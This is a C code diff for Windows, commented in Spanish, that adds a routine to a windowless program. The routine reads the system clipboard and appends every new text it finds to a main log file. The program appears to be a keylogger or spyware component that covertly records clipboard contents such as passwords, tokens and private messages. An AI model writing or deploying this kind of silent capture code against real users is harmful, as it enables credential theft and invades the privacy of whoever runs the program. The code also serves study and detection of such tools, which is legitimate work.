@@ -34,7 +34,7 @@ void DebugLog(const char* format, ...)
  */
 
 // variable estatica para recordar el ultimo texto guardado
-//static char lastClipboardText[512] = {0};
+static char lastClipboardText[512] = {0};
 
 // funcion para registrar el contenido del portapapeles
 void LogClipboardIfChanged(void)
@@ -44,5 +44,36 @@ void LogClipboardIfChanged(void)
         DebugLog("El archivo de log principal no está abierto. Saliendo.");
         return ;
     }
-    DebugLog("El archivo de log esta abierto\n.");
+
+        // Intentamos abrir el portapapeles, si no, lo intentamos despues
+        // Pasamos NULL porque nuestro programa no tiene una ventana principal (HWND)
+        if (!OpenClipboard(NULL)) {
+            return;
+        }
+        // Vemos que hay dentro del porpapeles
+        HANDLE hData = GetClipboardData(CF_TEXT);
+        if (hData == NULL) {
+            // Si devuelve NULL, significa que el porpapeles no tiene texto
+            CloseClipboard();
+            return;
+        }
+        // Bloqueamos el handle para obtener un puntero de memoria real
+        // convertido a char* para poder leerlo como texto
+        char* clipboardText = (char*)GlobalLock(hData);
+        if (clipboardText == NULL) {
+            CloseClipboard();
+            return;
+        }
+        // Comparamos el texto actual con el ultimo que guardamos.
+        if (strcmp(clipboardText, lastClipboardText) != 0 && strlen(clipboardText) > 0) {
+            // Escribimos cabecera portapapeles
+            fprintf(logFile, "\n\n--- [Init clipboard] ---\n%s\n--- [finish clipboard]---\n", clipboardText);
+            fflush(logFile);
+            // actualizamos nuestra memoria interna con el nuevo texto
+            strcpy_s(lastClipboardText, sizeof(lastClipboardText), clipboardText);
+        }
+        // Desbloqueamos la memoria
+        GlobalUnlock(hData);
+        //Cerramos portapapeles
+        CloseClipboard();
 }
